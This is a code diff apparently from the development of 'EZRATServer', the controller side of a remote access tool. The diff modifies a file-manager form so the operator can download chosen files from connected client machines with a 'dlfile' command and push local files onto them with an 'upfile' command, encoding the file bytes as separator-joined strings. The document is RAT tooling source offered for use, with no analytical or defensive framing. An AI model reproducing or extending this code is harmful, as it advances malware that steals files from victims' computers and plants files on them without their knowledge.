@@ -10,6 +10,7 @@ using System.Windows.Forms;
 using EZRATServer.Network;
 using EZRATServer.Forms;
 using EZRATServer.Utils;
+using System.IO;
 
 namespace EZRATServer
 {
@@ -73,8 +74,13 @@ namespace EZRATServer
 
         private void DownloadFile(object sender, EventArgs e)
         {
-            this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
-            this.BaseWindows.SendCommand("dlfile;" + this.PathDownload, this.Id);
+            if (lstFiles.SelectedItems.Count != 0)
+            {
+                this.PathDownload = Path + this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
+                this.BaseWindows.SendCommand("dlfile;" + this.PathDownload, this.Id);
+                this._parent.fileNameDownload = this.lstFiles.Items[lstFiles.Items.IndexOf(lstFiles.SelectedItems[0])].Text;
+                this._parent.OnOffDlFile = true;
+            }
         }
 
         private void UploadFile(object sender, EventArgs e)
@@ -84,7 +90,20 @@ namespace EZRATServer
 
             if (opf.ShowDialog() == DialogResult.OK)
             {
-                this.BaseWindows.SendFile(opf.FileName, this.lblPath.Text, this.Id);
+                string path = opf.FileName;
+                try
+                {
+                    //this._parent.SendFile(path,this.Path); //Send the data to the server
+                    string dataFile = string.Empty;
+                    File.ReadAllBytes(path).ToList().ForEach((b) => { dataFile += b.ToString() + Constantes.Separator; });
+                    //string result = _parent.Encrypt("upfile;" + dataFile);                    //string result = _parent.Encrypt("upfile;" + dataFile);
+                    this._parent.SendCommand("upfile;" + this.Path + new NameUpload(opf.FileName).Dialog()  + ";" + dataFile, _parent.GetIdClient());
+                }
+                catch (Exception ex) //Failed to send data to the server
+                {
+                    Console.WriteLine("Send File Failure " + ex.Message);
+                    return; //Return
+                }
             }
         }
 
@@ -170,7 +189,7 @@ namespace EZRATServer
 
         }
 
-        
+
 
         private void AddFileOrFolder(string name, FileType type, string size = "0")
         {
